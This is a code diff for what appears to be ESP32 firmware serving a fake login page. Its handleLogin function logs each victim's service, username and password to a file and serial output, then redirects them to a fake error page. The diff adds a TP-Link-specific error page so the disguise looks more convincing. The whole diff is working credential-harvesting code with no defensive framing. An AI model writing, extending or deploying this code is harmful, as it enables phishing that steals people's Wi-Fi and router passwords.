@@ -119,7 +119,7 @@ void setup() {
 
   // Enable HTTP server
   Serial.print("Starting HTTP server...");
-  server.on("/login.htm", handleLogin);
+  server.on("/login.htm", handleLogin);  
 #ifdef BLOCK_SSID_REQUEST
   server.on(getUrlFromFileName(FILENAME_SSID), send404);
 #endif
@@ -144,8 +144,10 @@ void loop() {
 void handleLogin() {
   // Save form data to text file
   File logFile = SPIFFS.open(FILENAME_DATALOG, FILE_WRITE);
+  String loginService;
   if (logFile) {
-    String logLine = server.arg("svc");
+    loginService = server.arg("svc");
+    String logLine = loginService;
     logLine += "\t" + server.arg("usr");
     logLine += "\t" + server.arg("pwd");
     Serial.println(logLine);
@@ -155,12 +157,18 @@ void handleLogin() {
     Serial.println("Error opening data file.");
   }
 
-  // Redirect to error page
-  String message = "<html><head><title>302 Found</title></head><body><a href=\"/error.htm\">Continue here</a></body></html>";
+  // Decide where to redirect
+  String redirectLocation = "/error.htm";
+  if(loginService.indexOf("tp-link") > -1){redirectLocation = "/err-tp.htm";}
+
+  // Execute redirect to decided page  
+  String message = "<html><head><title>302 Found</title></head><body><a href=\"";
+  message += redirectLocation;
+  message += "\">Continue here</a></body></html>";
   server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
   server.sendHeader("Pragma", "no-cache");
   server.sendHeader("Expires", "-1");
-  server.sendHeader("Location", "/error.htm");
+  server.sendHeader("Location", redirectLocation);
   server.send(302, "text/html", message);
 }
 
